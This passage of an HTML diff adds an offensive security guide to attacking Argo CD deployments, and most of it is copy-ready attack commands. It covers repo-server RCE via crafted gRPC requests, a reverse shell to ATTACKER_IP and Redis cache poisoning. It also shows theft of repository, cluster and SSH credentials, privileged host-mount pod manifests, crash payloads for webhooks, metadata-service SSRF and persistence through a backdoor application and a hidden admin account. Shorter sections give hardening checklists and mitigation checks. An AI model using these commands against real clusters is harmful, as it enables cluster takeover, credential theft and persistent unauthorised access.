+  <div class="chain-step"><span class="chain-num">5</span><div class="chain-text"><strong>Connect to Redis, poison cached manifests</strong> — Replace legitimate cached manifests with malicious ones (e.g., privileged pod with hostPID/hostNetwork).</div></div>
+  <div class="chain-step"><span class="chain-num">6</span><div class="chain-text"><strong>Auto Sync deploys malicious manifest</strong> — Application controller reads poisoned cache, applies to target cluster with cluster-admin privileges.</div></div>
+  <div class="chain-step"><span class="chain-num">7</span><div class="chain-text"><strong>Cluster takeover</strong> — Attacker workload runs with full authority Argo CD carries.</div></div>
+</div>
+
+<h3>Exploitation Steps</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Step 1: Verify connectivity from compromised pod
+nc -zv argocd-repo-server.argocd.svc.cluster.local 8081
+nc -zv argocd-redis.argocd.svc.cluster.local 6379
+
+# Step 2: Install grpcurl in compromised pod (or bring static binary)
+# Send GenerateManifest request with malicious kustomize options
+grpcurl -plaintext \
+  -d '{
+    "repo": {"repo": "https://github.com/attacker/evil-repo"},
+    "revision": "main",
+    "path": ".",
+    "kustomize_options": {
+      "build_options": "--enable-helm --helm-command ./exploit.sh"
+    }
+  }' \
+  argocd-repo-server.argocd.svc.cluster.local:8081 \
+  repository.RepoServerService/GenerateManifest
+
+# Step 3: Inside exploit.sh in the attacker's Git repo:
+#!/bin/sh
+# Exfiltrate Redis password
+env | grep REDIS > /tmp/out
+# Or reverse shell
+sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+# Step 4: Connect to Redis with stolen password
+redis-cli -h argocd-redis.argocd.svc.cluster.local -a "$REDIS_PASSWORD"
+
+# Step 5: Enumerate and poison cache
+# List keys to find cached manifest entries
+redis-cli -h argocd-redis.argocd.svc.cluster.local -a "$REDIS_PASSWORD" \
+  KEYS "git-*"
+
+# Replace cached manifest with malicious YAML
+# (The exact key format depends on the app/revision being cached)</div></div>
+
+<div class="callout callout-info">
+  <div class="callout-title">Detection Checks</div>
+  During an assessment, verify whether the target has Kubernetes NetworkPolicies enforced in the argocd namespace. Argo CD ships default policies but Helm installations disable them by default (<code>global.networkPolicy.create: false</code>). Also check if Redis auth is enabled and if TLS is configured between components.
+</div>
+
+<h3>Mitigation Verification</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Check if NetworkPolicies exist
+kubectl get networkpolicy -n argocd
+
+# Verify the Helm values
+helm get values argocd -n argocd | grep -A5 networkPolicy
+
+# Check Redis authentication
+kubectl exec -n argocd deploy/argocd-redis -- redis-cli ping
+# If NOAUTH → auth is disabled
+
+# Check Redis TLS
+kubectl get cm argocd-cmd-params-cm -n argocd -o yaml | grep redis</div></div>
+</div>
+
+<!-- REDIS ATTACKS -->
+<div class="section" id="sec-redis" data-nav="Redis Attacks" data-group="Exploitation">
+<h2>Redis Cache Attacks</h2>
+
+<h3>Redis in Argo CD Context</h3>
+<p>Redis stores the manifest cache, repo cache, and app state. It is the bridge between repo-server and application-controller. Historically, Redis runs without TLS and without authentication in many deployments.</p>
+
+<h3>Unauthenticated Access</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Test unauthenticated access
+redis-cli -h argocd-redis.argocd.svc.cluster.local PING
+# PONG = no auth
+
+# If auth is required, password is often in:
+# 1. repo-server environment: REDIS_PASSWORD
+# 2. argocd-secret: REDIS_PASSWORD key
+# 3. argocd-cmd-params-cm ConfigMap
+kubectl get secret argocd-secret -n argocd \
+  -o jsonpath='{.data.redis\.password}' | base64 -d
+
+# Dump all keys
+redis-cli -h argocd-redis.argocd.svc.cluster.local KEYS "*"
+
+# Look for cached manifests
+redis-cli -h argocd-redis.argocd.svc.cluster.local KEYS "git-*"
+redis-cli -h argocd-redis.argocd.svc.cluster.local KEYS "manifest-*"
+
+# Dump a specific cached manifest
+redis-cli -h argocd-redis.argocd.svc.cluster.local \
+  GET "git-<repo-url>-<revision>"</div></div>
+
+<h3>Cache Poisoning for Manifest Injection</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Replace cached manifest with privileged pod
+# First, read the existing cached value to understand the format
+redis-cli -h argocd-redis.argocd.svc.cluster.local \
+  GET "<target-manifest-key>" > /tmp/original.json
+
+# Modify the manifest to include a malicious workload
+# Then write it back:
+redis-cli -h argocd-redis.argocd.svc.cluster.local \
+  SET "<target-manifest-key>" '<modified-manifest-json>'
+
+# When Auto Sync fires, the application-controller reads the
+# poisoned cache and deploys the attacker's manifest
+
+# If Auto Sync is NOT enabled, wait for manual sync or trigger via API</div></div>
+
+<div class="callout callout-warn">
+  <div class="callout-title">CVE-2024-31989</div>
+  A prior Redis-related vulnerability demonstrated that unprivileged pods could access Argo CD's Redis instance and manipulate cached data. The repo-server RCE chain revives this attack path.
+</div>
+</div>
+
+<!-- GIT REPO ATTACKS -->
+<div class="section" id="sec-git" data-nav="Git Repository Attacks" data-group="Exploitation">
+<h2>Git Repository & Supply Chain Attacks</h2>
+
+<h3>Credential Harvesting</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Extract repo credentials from K8s secrets
+kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository \
+  -o json | jq '.items[] | {
+    repo: (.data.url // .data.project | @base64d),
+    type: (.data.type | @base64d),
+    username: (.data.username | @base64d),
+    password: (.data.password | @base64d),
+    sshPrivateKey: (if .data.sshPrivateKey then "PRESENT" else "NONE" end)
+  }'
+
+# Extract credential templates (wildcard creds)
+kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repo-creds \
+  -o json | jq '.items[] | {
+    url: (.data.url | @base64d),
+    username: (.data.username | @base64d),
+    password: (.data.password | @base64d)
+  }'
+
+# Via API (requires repos access)
+curl -sk https://argocd.target.com/api/v1/repositories \
+  -H "Authorization: Bearer $TOKEN" | jq .
+
+# Via API with CVE-2025-55190 (any projects,get token)
+curl -sk https://argocd.target.com/api/v1/projects/default/detailed \
+  -H "Authorization: Bearer $TOKEN" | jq '.repositoryCredentials'</div></div>
+
+<h3>Malicious Manifest Injection via Git</h3>
+<div class="code-block"><div class="code-header"><span class="lang">yaml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># If you have write access to a connected Git repo,
+# inject a privileged pod manifest:
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: debug-node
+  namespace: kube-system
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: shell
+    image: alpine
+    command: ["/bin/sh", "-c", "sleep infinity"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+  nodeSelector:
+    kubernetes.io/os: linux</div></div>
+
+<h3>Helm Chart Poisoning</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># If ArgoCD uses Helm charts from an attacker-accessible repo:
+
+# 1. Modify templates/deployment.yaml to add init container
+#    that exfiltrates secrets or establishes persistence
+
+# 2. Modify values.yaml to change image to attacker-controlled
+
+# 3. Add a post-install hook that runs a reverse shell:
+# templates/post-install-hook.yaml
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: post-install
+  annotations:
+    "helm.sh/hook": post-install
+spec:
+  template:
+    spec:
+      containers:
+      - name: hook
+        image: attacker/reverse-shell:latest
+      restartPolicy: Never</div></div>
+
+<h3>Kustomize Overlay Attacks</h3>
+<div class="code-block"><div class="code-header"><span class="lang">yaml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># kustomization.yaml — add a strategic merge patch to escalate
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+resources:
+  - deployment.yaml
+patchesStrategicMerge:
+  - escalation-patch.yaml
+
+# escalation-patch.yaml — inject privileged container
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: target-app
+spec:
+  template:
+    spec:
+      containers:
+      - name: sidecar
+        image: attacker/implant:latest
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - name: sa-token
+          mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+      volumes:
+      - name: sa-token
+        projected:
+          sources:
+          - serviceAccountToken:
+              path: token
+              expirationSeconds: 86400</div></div>
+</div>
+
+<!-- WEBHOOK ATTACKS -->
+<div class="section" id="sec-webhooks" data-nav="Webhook Attacks" data-group="Exploitation">
+<h2>Webhook Attacks</h2>
+
+<h3>Webhook Endpoint Discovery</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># ArgoCD webhook endpoint (usually unauthenticated)
+# GitHub:     POST /api/webhook
+# GitLab:     POST /api/webhook
+# Bitbucket:  POST /api/webhook
+# Generic:    POST /api/webhook
+
+# Check if webhook secret is configured
+kubectl get secret argocd-secret -n argocd \
+  -o jsonpath='{.data.webhook\.github\.secret}' | base64 -d
+kubectl get secret argocd-secret -n argocd \
+  -o jsonpath='{.data.webhook\.gitlab\.secret}' | base64 -d
+kubectl get secret argocd-secret -n argocd \
+  -o jsonpath='{.data.webhook\.bitbucket\.secret}' | base64 -d
+
+# If no secret is configured, anyone can trigger syncs!</div></div>
+
+<h3>DoS via Malformed Webhooks</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># CVE-2025-32619: Azure DevOps webhook panic (unauthenticated DoS)
+# Malformed git.push payload crashes argocd-server
+curl -sk -X POST https://argocd.target.com/api/webhook \
+  -H "Content-Type: application/json" \
+  -d '{"eventType":"git.push","resource":{"refUpdates":[{"name":null}]}}'
+
+# CVE-2025-29513: Bitbucket Server webhook panic
+# Malformed payload causes argocd-server to crash
+curl -sk -X POST https://argocd.target.com/api/webhook \
+  -H "Content-Type: application/json" \
+  -H "X-Event-Key: repo:refs_changed" \
+  -d '{"changes":[{"ref":null}]}'
+
+# Trigger forced refresh/sync for all apps watching a repo
+curl -sk -X POST https://argocd.target.com/api/webhook \
+  -H "Content-Type: application/json" \
+  -H "X-GitHub-Event: push" \
+  -d '{
+    "repository": {"clone_url": "https://github.com/org/target-repo.git"},
+    "ref": "refs/heads/main"
+  }'</div></div>
+
+<h3>Notification Webhook SSRF</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># If you can modify notification configs (argocd-notifications-cm):
+# Set webhook destination to internal service
+# This enables SSRF to metadata services, internal APIs, etc.
+
+kubectl edit cm argocd-notifications-cm -n argocd
+# Add:
+#   service.webhook.evil: |
+#     url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+#     headers:
+#       - name: Content-Type
+#         value: application/json</div></div>
+</div>
+
+<!-- POST-EXPLOITATION -->
+<div class="section" id="sec-postexploit" data-nav="Post-Exploitation" data-group="Exploitation">
+<h2>Post-Exploitation & Lateral Movement</h2>
+
+<h3>Cluster Credential Extraction</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Extract ALL managed cluster credentials
+kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=cluster \
+  -o json | jq '.items[] | {
+    name: (.data.name | @base64d),
+    server: (.data.server | @base64d),
+    config: (.data.config | @base64d | fromjson)
+  }'
+
+# The config field contains:
+# - bearerToken: SA token for the managed cluster
+# - tlsClientConfig: cert/key for mTLS auth
+# - execProviderConfig: command-based auth (AWS IAM, etc.)
+
+# Use extracted creds to access managed clusters
+kubectl --server="https://managed-cluster.example.com" \
+  --token="$EXTRACTED_BEARER_TOKEN" \
+  --insecure-skip-tls-verify \
+  get pods --all-namespaces
+
+# Or create a kubeconfig entry
+kubectl config set-cluster stolen \
+  --server="$CLUSTER_SERVER" --insecure-skip-tls-verify
+kubectl config set-credentials stolen --token="$EXTRACTED_TOKEN"
+kubectl config set-context stolen --cluster=stolen --user=stolen
+kubectl config use-context stolen</div></div>
+
+<h3>SSH Key Extraction for Git Pivoting</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Extract SSH private keys used for Git repos
+kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository \
+  -o json | jq -r '.items[] | select(.data.sshPrivateKey) |
+    "# Repo: " + (.data.url | @base64d) + "\n" +
+    (.data.sshPrivateKey | @base64d)'
+
+# Use stolen SSH key to clone private repos
+GIT_SSH_COMMAND="ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no" \
+  git clone git@github.com:org/private-repo.git
+
+# Look for secrets in cloned repos
+trufflehog filesystem /tmp/private-repo
+gitleaks detect -s /tmp/private-repo</div></div>
+
+<h3>Persistence via GitOps</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Create a self-healing backdoor app with Auto Sync + Self Heal
+# ArgoCD will continuously re-deploy it even if manually removed
+
+argocd app create persistence \
+  --repo https://github.com/attacker/backdoor-manifests \
+  --path . \
+  --dest-server https://kubernetes.default.svc \
+  --dest-namespace kube-system \
+  --sync-policy automated \
+  --self-heal \
+  --auto-prune
+
+# Add a new local admin account for persistent API access
+kubectl patch cm argocd-cm -n argocd --type merge \
+  -p '{"data":{"accounts.svc-backup":"apiKey,login"}}'
+
+# Set password for the new account
+argocd account update-password \
+  --account svc-backup \
+  --new-password 'S3cur3P@ss!' \
+  --current-password "$ADMIN_PASS"
+
+# Generate a long-lived API token
+argocd account generate-token --account svc-backup
+
+# Grant admin to the new account
+kubectl patch cm argocd-rbac-cm -n argocd --type merge \
+  -p '{"data":{"policy.csv":"g, svc-backup, role:admin\n"}}'</div></div>
+
+<h3>ArgoCD Service Account Abuse</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># The application-controller SA typically has cluster-admin
+# If you can exec into or get a shell on the controller pod:
+
+# Extract the service account token
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Use it directly against the K8s API
+curl -sk https://kubernetes.default.svc/api/v1/namespaces \
+  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
+
+# Check what this SA can do
+kubectl auth can-i --list \
+  --token="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"</div></div>
+</div>
+
+<!-- DEX/SSO -->
+<div class="section" id="sec-dex" data-nav="Dex & SSO Attacks" data-group="Exploitation">
+<h2>Dex & SSO Attacks</h2>
+
+<h3>Dex Configuration Analysis</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Extract Dex configuration
+kubectl get cm argocd-cm -n argocd -o jsonpath='{.data.dex\.config}'
+
+# Look for:
+# - staticClients with known/weak client secrets
+# - enablePasswordDB: true (enables local Dex accounts)
+# - staticPasswords with bcrypt hashes (crack them)
+# - connectors exposing LDAP bind credentials
+# - connectors with insecureSkipVerify: true
+
+# Extract Dex client secret
+kubectl get cm argocd-cm -n argocd -o yaml | grep -A5 staticClients
+
+# Dex's gRPC port (5557) is internal and often reachable from cluster
+nc -zv argocd-dex-server.argocd.svc.cluster.local 5557
+
+# If you can reach Dex directly, attempt OIDC flows
+# to bypass ArgoCD's intended auth path</div></div>
+
+<h3>OIDC/SSO Bypass Techniques</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Check OIDC configuration
+kubectl get cm argocd-cm -n argocd -o jsonpath='{.data.oidc\.config}'
+
+# If requestedIDTokenClaims or requestedScopes are misconfigured,
+# group claims might not be properly mapped → default role applies
+
+# Test: login via SSO, decode your JWT, check groups claim
+argocd account get-user-info
+# Compare groups in token vs RBAC policies
+
+# If scopes in argocd-rbac-cm don't match the OIDC claim name,
+# ALL SSO users get the default role (potentially admin)
+
+# Check for open redirect in callback URL
+# If allowedRedirectURIs is not restricted:
+https://argocd.target.com/auth/callback?redirect_uri=https://evil.com</div></div>
+</div>
+
+<!-- CVE REFERENCE -->
+<div class="section" id="sec-cves" data-nav="CVE Reference" data-group="Reference">
+<h2>CVE & Vulnerability Reference</h2>
+
+<table>
+  <tr><th>CVE / Advisory</th><th>Severity</th><th>Component</th><th>Description</th><th>Fixed In</th></tr>
+  <tr>
+    <td><code>No CVE (Synacktiv)</code></td>
+    <td><span class="tag tag-critical">CRITICAL</span><span class="tag tag-unpatched">UNPATCHED</span></td>
+    <td>repo-server</td>
+    <td>Unauthenticated RCE via GenerateManifest gRPC + Kustomize helm-command abuse → cluster takeover</td>
+    <td>None (Jul 2026)</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2025-55190</code></td>
+    <td><span class="tag tag-critical">CRITICAL</span></td>
+    <td>API server</td>
+    <td>Project API token with basic get permission leaks all repository credentials via /detailed endpoint</td>
+    <td>2.13.9, 2.14.16, 3.0.14, 3.1.2</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2026-42880</code></td>
+    <td><span class="tag tag-critical">CRITICAL</span></td>
+    <td>API server</td>
+    <td>K8s secret extraction via ServerSideDiff — read-only users can extract secrets in plaintext</td>
+    <td>3.2.11, 3.3.9</td>
+  </tr>
+  <tr>
+    <td><code>GHSA-rg3g-4rw9-gqrp</code></td>
+    <td><span class="tag tag-medium">MODERATE</span></td>
+    <td>API server</td>
+    <td>Secret extraction via ServerSideDiff using sensitive annotations</td>
+    <td>See advisory</td>
+  </tr>
+  <tr>
+    <td><code>GHSA-h98r-wv3h-fr38</code></td>
+    <td><span class="tag tag-high">HIGH</span></td>
+    <td>UI</td>
+    <td>Stored XSS in application link annotations enables developer-to-admin privilege escalation</td>
+    <td>See advisory</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2025-32619</code></td>
+    <td><span class="tag tag-high">HIGH</span></td>
+    <td>API server</td>
+    <td>Unauthenticated DoS via malformed Azure DevOps git.push webhook</td>
+    <td>See advisory</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2025-29513</code></td>
+    <td><span class="tag tag-high">HIGH</span></td>
+    <td>API server</td>
+    <td>Unauthenticated server panic via malformed Bitbucket webhook</td>
+    <td>See advisory</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2024-31989</code></td>
+    <td><span class="tag tag-high">HIGH</span></td>
+    <td>Redis</td>
+    <td>Unprivileged pods can access Redis and manipulate cached deployment data</td>
+    <td>2.8.19, 2.9.15, 2.10.10</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2024-28175</code></td>
+    <td><span class="tag tag-high">HIGH</span></td>
+    <td>UI</td>
+    <td>XSS via application resource names in the web UI</td>
+    <td>2.8.13, 2.9.9, 2.10.4</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2024-21661</code></td>
+    <td><span class="tag tag-high">HIGH</span></td>
+    <td>API server</td>
+    <td>Denial-of-service via crafted API server requests</td>
+    <td>2.8.13, 2.9.9, 2.10.4</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2023-40029</code></td>
+    <td><span class="tag tag-critical">CRITICAL</span></td>
+    <td>repo-server</td>
+    <td>Cluster secret leakage via Helm chart values containing templated cluster secrets</td>
+    <td>2.6.14, 2.7.12, 2.8.1</td>
+  </tr>
+  <tr>
+    <td><code>CVE-2022-24348</code></td>
+    <td><span class="tag tag-high">HIGH</span></td>
+    <td>repo-server</td>
+    <td>Path traversal via Helm chart values files allows reading out-of-bounds files</td>
+    <td>2.1.11, 2.2.6, 2.3.0</td>
+  </tr>
+</table>
+</div>
+
+<!-- ADVERSARY EMULATION -->
+<div class="section" id="sec-adversary" data-nav="Adversary Emulation" data-group="Adversary Emulation">
+<h2>Adversary Emulation Scenarios</h2>
+
+<h3>MITRE ATT&CK Mapping (Containers / Cloud)</h3>
+<table>
+  <tr><th>Tactic</th><th>Technique</th><th>ArgoCD Context</th></tr>
+  <tr><td>Initial Access</td><td>T1190 Exploit Public-Facing App</td><td>Exposed argocd-server, default creds, webhook abuse</td></tr>
+  <tr><td>Initial Access</td><td>T1078 Valid Accounts</td><td>Stolen JWT, leaked API tokens, initial-admin-secret</td></tr>
+  <tr><td>Execution</td><td>T1609 Container Admin Command</td><td>Exec into managed pods, repo-server RCE</td></tr>
+  <tr><td>Persistence</td><td>T1098 Account Manipulation</td><td>Create local accounts, generate API tokens</td></tr>
+  <tr><td>Persistence</td><td>T1525 Implant Container Image</td><td>Modify Git source → deploy implant via GitOps pipeline</td></tr>
+  <tr><td>Privilege Escalation</td><td>T1078.004 Cloud Accounts</td><td>Project token → repo cred leakage, RBAC misconfig escalation</td></tr>
+  <tr><td>Defense Evasion</td><td>T1562 Impair Defenses</td><td>Modify resource exclusions, disable notifications</td></tr>
+  <tr><td>Credential Access</td><td>T1528 Steal Application Access Token</td><td>Extract cluster bearer tokens, Git SSH keys, signing key</td></tr>
+  <tr><td>Credential Access</td><td>T1552 Unsecured Credentials</td><td>Redis no-auth, initial-admin-secret, K8s secrets in argocd ns</td></tr>
+  <tr><td>Discovery</td><td>T1613 Container/Resource Discovery</td><td>Enumerate apps, projects, clusters, repos via API</td></tr>
+  <tr><td>Lateral Movement</td><td>T1021 Remote Services</td><td>Use stolen cluster creds to pivot to managed clusters</td></tr>
+  <tr><td>Collection</td><td>T1530 Data from Cloud Storage</td><td>Clone private repos with stolen Git credentials</td></tr>
+  <tr><td>Impact</td><td>T1496 Resource Hijacking</td><td>Deploy cryptominers via GitOps pipeline</td></tr>
+  <tr><td>Impact</td><td>T1485 Data Destruction</td><td>Delete all apps, enable auto-prune to wipe workloads</td></tr>
+</table>
+
+<h3>Scenario 1: External Attacker → Full Cluster Compromise</h3>
+<div class="attack-chain">
+  <div class="chain-step"><span class="chain-num">1</span><div class="chain-text"><strong>Recon:</strong> Identify exposed argocd-server via Shodan/certificate transparency</div></div>
+  <div class="chain-step"><span class="chain-num">2</span><div class="chain-text"><strong>Initial Access:</strong> Try default credentials (admin / pod-name). Brute force /api/v1/session (no rate limiting)</div></div>
+  <div class="chain-step"><span class="chain-num">3</span><div class="chain-text"><strong>Enumeration:</strong> List applications, repositories, clusters, projects via API</div></div>
+  <div class="chain-step"><span class="chain-num">4</span><div class="chain-text"><strong>Credential Theft:</strong> CVE-2025-55190 → leak repo credentials. Extract cluster secrets via API</div></div>
+  <div class="chain-step"><span class="chain-num">5</span><div class="chain-text"><strong>Supply Chain:</strong> Use stolen Git creds to push malicious manifests to source repos</div></div>
+  <div class="chain-step"><span class="chain-num">6</span><div class="chain-text"><strong>Execution:</strong> ArgoCD auto-syncs malicious manifests → deploys attacker workloads cluster-wide</div></div>
+  <div class="chain-step"><span class="chain-num">7</span><div class="chain-text"><strong>Persistence:</strong> Create hidden admin account + self-healing backdoor Application</div></div>
+</div>
+
+<h3>Scenario 2: Compromised Pod → Cluster Takeover (Repo-Server RCE)</h3>
+<div class="attack-chain">
+  <div class="chain-step"><span class="chain-num">1</span><div class="chain-text"><strong>Initial Foothold:</strong> Compromise any pod in the cluster (web app vuln, misconfigured CI runner, etc.)</div></div>
+  <div class="chain-step"><span class="chain-num">2</span><div class="chain-text"><strong>Discovery:</strong> Scan for argocd services. Check reachability to repo-server:8081 and redis:6379</div></div>
+  <div class="chain-step"><span class="chain-num">3</span><div class="chain-text"><strong>RCE:</strong> Send crafted gRPC request to GenerateManifest with malicious kustomize --helm-command</div></div>
+  <div class="chain-step"><span class="chain-num">4</span><div class="chain-text"><strong>Credential Theft:</strong> Read REDIS_PASSWORD from repo-server environment</div></div>
+  <div class="chain-step"><span class="chain-num">5</span><div class="chain-text"><strong>Cache Poisoning:</strong> Connect to Redis, overwrite cached manifests with privileged workload</div></div>
+  <div class="chain-step"><span class="chain-num">6</span><div class="chain-text"><strong>Deployment:</strong> Application controller syncs poisoned cache → deploys attacker workload with cluster-admin authority</div></div>
+  <div class="chain-step"><span class="chain-num">7</span><div class="chain-text"><strong>Cluster Takeover:</strong> Attacker workload has same privileges as ArgoCD — full control of cluster and all managed clusters</div></div>
+</div>
+
+<h3>Scenario 3: Low-Privilege User → Admin Escalation</h3>
+<div class="attack-chain">
+  <div class="chain-step"><span class="chain-num">1</span><div class="chain-text"><strong>Access:</strong> Authenticated as developer with limited RBAC role (applications, get/sync on one project)</div></div>
+  <div class="chain-step"><span class="chain-num">2</span><div class="chain-text"><strong>Explore:</strong> Check RBAC misconfiguration — is policy.default too permissive? Are scopes mapped correctly?</div></div>
+  <div class="chain-step"><span class="chain-num">3</span><div class="chain-text"><strong>Credential Leak:</strong> Use CVE-2025-55190 to extract repo credentials via project detailed endpoint</div></div>
+  <div class="chain-step"><span class="chain-num">4</span><div class="chain-text"><strong>Secret Extraction:</strong> Use CVE-2026-42880 (ServerSideDiff) to read K8s secrets as read-only user</div></div>
+  <div class="chain-step"><span class="chain-num">5</span><div class="chain-text"><strong>XSS Escalation:</strong> Inject stored XSS in application annotations (GHSA-h98r-wv3h-fr38) → steal admin session</div></div>
+  <div class="chain-step"><span class="chain-num">6</span><div class="chain-text"><strong>Full Control:</strong> Use stolen admin session to create persistent admin account and extract all secrets</div></div>
+</div>
+
+<h3>Scenario 4: Supply Chain — Compromised Helm Chart / OCI Registry</h3>
+<div class="attack-chain">
+  <div class="chain-step"><span class="chain-num">1</span><div class="chain-text"><strong>Target:</strong> Identify Helm repos or OCI registries used by ArgoCD applications</div></div>
+  <div class="chain-step"><span class="chain-num">2</span><div class="chain-text"><strong>Compromise:</strong> Push malicious chart version to the registry (via stolen creds or registry vuln)</div></div>
+  <div class="chain-step"><span class="chain-num">3</span><div class="chain-text"><strong>Trigger:</strong> ArgoCD detects "new version" and auto-syncs (if automated sync policy)</div></div>
+  <div class="chain-step"><span class="chain-num">4</span><div class="chain-text"><strong>Execution:</strong> Malicious chart deploys across all clusters watching that source</div></div>
+  <div class="chain-step"><span class="chain-num">5</span><div class="chain-text"><strong>Blast Radius:</strong> Self-heal ensures persistence — manual deletion triggers re-deployment</div></div>
+</div>
+</div>
+
+<!-- HARDENING CHECKS -->
+<div class="section" id="sec-hardening" data-nav="Hardening Assessment" data-group="Reference">
+<h2>Hardening & Security Assessment Checklist</h2>
+
+<h3>Authentication & Access Control</h3>
+<ul class="checklist">
+  <li>Initial admin secret deleted after setup (<code>argocd-initial-admin-secret</code>)</li>
+  <li>Admin password changed from default (pod name)</li>
+  <li>SSO/OIDC configured; local accounts disabled where possible</li>
+  <li>API tokens have appropriate expiry (not indefinite)</li>
+  <li>RBAC policy.default is <code>role:readonly</code> or more restrictive, not <code>role:admin</code></li>
+  <li>OIDC scopes correctly mapped in argocd-rbac-cm</li>
+  <li>No wildcard policies (<code>*, *, *</code>) in policy.csv</li>
+  <li>Exec disabled unless explicitly required (<code>exec.enabled</code>)</li>
+  <li>User accounts follow least privilege per project</li>
+</ul>
+
+<h3>Network Security</h3>
+<ul class="checklist">
+  <li>Kubernetes NetworkPolicies enforced in argocd namespace</li>
+  <li>Repo-server gRPC (8081) not reachable from non-ArgoCD pods</li>
+  <li>Redis (6379) not reachable from non-ArgoCD pods</li>
+  <li>Dex (5556/5557) not reachable from non-ArgoCD pods</li>
+  <li>ArgoCD server not exposed to internet without WAF/auth proxy</li>
+  <li>TLS enabled between all ArgoCD components</li>
+  <li>TLS enabled for Redis connections</li>
+  <li>Webhook endpoints validated with shared secrets</li>
+</ul>
+
+<h3>Secret Management</h3>
+<ul class="checklist">
+  <li>Redis authentication enabled with strong password</li>
+  <li>etcd encryption at rest enabled (protects Redis password in secrets)</li>
+  <li>Git credentials use short-lived tokens, not long-lived passwords</li>
+  <li>Cluster credentials follow least privilege (not cluster-admin)</li>
+  <li>server.secretkey rotated periodically</li>
+  <li>No plaintext secrets in argocd-cm ConfigMap</li>
+  <li>Webhook secrets configured for all connected Git providers</li>
+</ul>
+
+<h3>Deployment Configuration</h3>
+<ul class="checklist">
+  <li>ArgoCD runs in a dedicated namespace with restricted access</li>
+  <li>Pod Security Standards enforced on ArgoCD pods</li>
+  <li>Resource exclusions don't block security-relevant resources from sync</li>
+  <li>Application projects restrict destination clusters and namespaces</li>
+  <li>Projects restrict sourceRepos to known-good repositories</li>
+  <li>ClusterResourceWhitelist is scoped (not <code>*/*</code>)</li>
+  <li>Auto-sync + self-heal reviewed for security implications</li>
+  <li>Notifications configured for security-relevant events</li>
+</ul>
+
+<h3>Monitoring & Detection</h3>
+<ul class="checklist">
+  <li>API audit logging enabled</li>
+  <li>Monitor for new account creation or token generation</li>
+  <li>Alert on application source changes</li>
+  <li>Alert on new cluster or repository additions</li>
+  <li>Monitor for unusual ServerSideDiff API calls</li>
+  <li>Monitor Redis for unexpected client connections</li>
+  <li>Monitor repo-server for anomalous outbound connections</li>
+</ul>
+</div>
+
+<!-- TOOLS -->
+<div class="section" id="sec-tools" data-nav="Tools & Commands" data-group="Reference">
+<h2>Tools & Command Quick Reference</h2>
+
+<h3>ArgoCD CLI Cheat Sheet</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Authentication
+argocd login TARGET --insecure --username admin --password PASS
+argocd login TARGET --insecure --sso                  # SSO login
+argocd account get-user-info                          # Current user info
+argocd account list                                   # List all accounts
+argocd account generate-token --account NAME          # Gen API key
+
